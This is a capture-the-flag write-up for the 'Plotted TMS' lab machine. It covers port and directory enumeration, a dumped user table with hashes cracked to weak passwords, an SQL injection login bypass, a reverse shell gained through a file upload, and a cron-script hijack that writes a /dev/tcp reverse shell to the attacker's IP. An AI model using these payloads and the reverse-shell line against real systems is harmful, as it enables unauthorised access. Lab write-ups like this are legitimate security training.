# Plotted Tms

> ip 10.10.123.10


---------------------------

**Enumuration nmap**

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.123.10              
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-21 21:32 EST
Nmap scan report for 10.10.123.10
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.18 seconds
```
**Gobuster scan on port 80**

```bash
                                                                                    
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.123.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.123.10/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/21 21:36:16 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.123.10/admin/]
/shadow               (Status: 200) [Size: 25]                                  
/passwd               (Status: 200) [Size: 25]                           
```

**on admin there is id_rsa but with encrypted**

```bash
┌──(kali㉿kali)-[~]
└─$ echo "VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE" | base64 -d
Trust me it is not this easy..now get back to enumeration :D
```

**on /shadow and /passwd similar encrypted key**

```bash
┌──(kali㉿kali)-[~]
└─$ echo "bm90IHRoaXMgZWFzeSA6RA==" | base64 -d 
not this easy :D  
```
**Tried Searchsploit**

```bash
it Title          |  Path
------------------------ ---------------------------------
Apache + PHP < 5.3.12 / | php/remote/29290.c
Apache + PHP < 5.3.12 / | php/remote/29316.py
Apache CXF < 2.5.10/2.6 | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7  | unix/remote/21671.c
Apache mod_ssl < 2.8.7  | unix/remote/47080.c
Apache mod_ssl < 2.8.7  | unix/remote/764.c
Apache OpenMeetings 1.9 | linux/webapps/39642.txt
Apache Tomcat < 5.5.17  | multiple/remote/2061.txt
Apache Tomcat < 6.0.18  | multiple/remote/6229.txt
Apache Tomcat < 6.0.18  | unix/remote/14489.c
Apache Tomcat < 9.0.1 ( | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 ( | windows/webapps/42953.txt
Apache Xerces-C XML Par | linux/dos/36906.txt
Webfroot Shoutbox < 2.3 | linux/remote/34.pl
------------------------ ---------------------------------
Shellcodes: No Results
```

**Gobuster on port 445**

```bash
──(kali㉿kali)-[~]
└─$ gobuster dir -u http://plotted-tms:445/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://plotted-tms:445/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/21 21:48:05 Starting gobuster in directory enumeration mode
===============================================================
/management           (Status: 301) [Size: 320] [--> http://plotted-tms:445/management/]
```

**from info gathered from manual enumuration**

```info

email of web developer : oretnom23@gmail.com

name who wrote the quote : Tommy Lasorda 

Copyright © TOMS 2021
```

**Gobuster Scan**

```bash 
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://plotted-tms:445/management/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://plotted-tms:445/management/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/21 21:50:43 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 328] [--> http://plotted-tms:445/management/uploads/]
/pages                (Status: 301) [Size: 326] [--> http://plotted-tms:445/management/pages/]  
/admin                (Status: 301) [Size: 326] [--> http://plotted-tms:445/management/admin/]  
/assets               (Status: 301) [Size: 327] [--> http://plotted-tms:445/management/assets/] 
/plugins              (Status: 301) [Size: 328] [--> http://plotted-tms:445/management/plugins/]
/database             (Status: 301) [Size: 329] [--> http://plotted-tms:445/management/database/]
/classes              (Status: 301) [Size: 328] [--> http://plotted-tms:445/management/classes/] 
/dist                 (Status: 301) [Size: 325] [--> http://plotted-tms:445/management/dist/]    
/inc                  (Status: 301) [Size: 324] [--> http://plotted-tms:445/management/inc/]     
/build                (Status: 301) [Size: 326] [--> http://plotted-tms:445/management/build/]   
/libs                 (Status: 301) [Size: 325] [--> http://plotted-tms:445/management/libs/]
```
**got the sql database and user and hashes**



```sql

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `firstname`, `lastname`, `username`, `password`, `avatar`, `last_login`, `type`, `date_added`, `date_updated`) VALUES
(1, 'Adminstrator', 'Admin', 'admin', '0192023a7bbd73250516f069df18b500', 'uploads/1624240500_avatar.png', NULL, 1, '2021-01-20 14:02:37', '2021-06-21 09:55:07'),
(9, 'John', 'Smith', 'jsmith', '1254737c076cf867dc53d60a0364f38e', 'uploads/1629336240_avatar.jpg', NULL, 2, '2021-08-19 09:24:25', NULL);

--
-- Indexes for dumped tables
```

**cracked hashed**

```bash

> from crackstation.net

admin : admin123
jsmith : jsmith123

```

_both the creds didn't work for portal login_


**tried sql injection and it worked**

```bash
 username: admin'#
 password: ' or 1=1 -- 
 ```

**there is the upload vuln and got the easy reverse shell**

```bash
                                                                                                                     
┌──(kali㉿kali)-[~/thm/machine/plotted+tms]
└─$ nc -nvlp 9578        
listening on [any] 9578 ...
connect to [10.11.62.16] from (UNKNOWN) [10.10.123.10] 58874
Linux plotted 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 03:14:11 up 47 min,  0 users,  load average: 0.00, 0.06, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@plotted:/$ export TERM=xterm
export TERM=xterm
www-data@plotted:/$ ^Z
zsh: suspended  nc -nvlp 9578
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/thm/machine/plotted+tms]
└─$ stty raw -echo; fg                                                                                                                                                                                                             148 ⨯ 1 ⚙
[1]  + continued  nc -nvlp 9578

www-data@plotted:/$ 

```
**Tried PwnKit but it has already been patched**

```bash
www-data@plotted:/tmp$ chmod +x PwnKit 
www-data@plotted:/tmp$ ./PwnKit 
www-data@plotted:/tmp$ ls
```


**Got a interesting result from linpeas scan**

```bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * 	* * *	plot_admin /var/www/scripts/backup.sh
```

**manupulating that file**

```bash
echo "sh -i >& /dev/tcp/10.11.62.16/9578 0>&1" > new 

mv backup.sh old && mv new backup.sh && chmod +x backup.sh

```
